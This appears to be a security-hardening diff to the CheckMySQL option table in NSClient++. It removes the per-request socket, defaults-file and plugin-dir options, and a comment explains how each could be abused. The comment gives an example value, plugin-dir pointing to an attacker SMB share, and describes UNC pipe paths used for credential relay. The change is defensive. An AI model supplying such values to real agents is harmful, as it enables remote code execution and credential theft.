@@ -14,18 +14,36 @@ namespace mysql_options {
 // Shared connection options for all CheckMySQL commands. `info` arrives
 // pre-populated with the module's /settings/mysql defaults, so options only
 // override what the user passes explicitly.
+//
+// Three connection parameters are deliberately NOT here, and are settable only
+// through /settings/mysql (nsclient.ini, admin-only on the modern layout):
+//
+//   plugin-dir    - the directory libmariadb LoadLibrary/dlopen's client auth
+//                   plugins from during connect (MySQL 8's caching_sha2_password
+//                   is one). A per-request value is arbitrary code execution as
+//                   the service account: `plugin-dir=\\attacker\share` loads and
+//                   runs a DLL off an SMB share inside the (LocalSystem) agent.
+//   socket        - a Windows named pipe can be a UNC path (\\host\pipe\x),
+//                   making the service authenticate outbound over SMB - the
+//                   credential-relay variant of the same problem.
+//   defaults-file - an arbitrary file the connector reads as the service
+//                   account (credential disclosure).
+//
+// None of the three is per-target the way host/port/database are; they are
+// deployment properties. Because parse_options() rejects any option not
+// registered here (boost throws unknown_option), leaving them out means a REST
+// caller who sends plugin-dir=... gets "Invalid command line", not a silent
+// load - the allowlist is the option table itself. See the CheckDocker
+// is_local_docker_endpoint() guard for the same UNC/SMB reasoning.
 inline void add_connection_options(boost::program_options::options_description &desc, mysql_client::connection_info &info) {
   namespace po = boost::program_options;
   // clang-format off
   desc.add_options()
     ("host", po::value<std::string>(&info.host)->default_value(info.host), "MySQL/MariaDB server to connect to.")
     ("port", po::value<int>(&info.port)->default_value(info.port), "TCP port of the server.")
-    ("socket", po::value<std::string>(&info.socket), "Unix socket path (or Windows named pipe) to connect through instead of TCP.")
     ("database", po::value<std::string>(&info.database), "Default database (schema) to connect to.")
     ("user", po::value<std::string>(&info.user), "User to authenticate with.")
     ("password", po::value<std::string>(&info.password), "Password to authenticate with.")
-    ("defaults-file", po::value<std::string>(&info.defaults_file), "my.cnf-style file whose [client] section supplies credentials, so passwords can be kept out of nsclient.ini.")
-    ("plugin-dir", po::value<std::string>(&info.plugin_dir), "Directory the connector loads client auth plugins from (needed for MySQL 8's caching_sha2_password when the connector's default is wrong).")
     ("tls", po::value<bool>(&info.tls)->implicit_value(true)->default_value(info.tls), "Require TLS on the connection.")
     ("timeout", po::value<int>(&info.connect_timeout)->default_value(info.connect_timeout), "Connection timeout in seconds.")
     ("query-timeout", po::value<int>(&info.query_timeout)->default_value(info.query_timeout), "Query (read/write) timeout in seconds.")
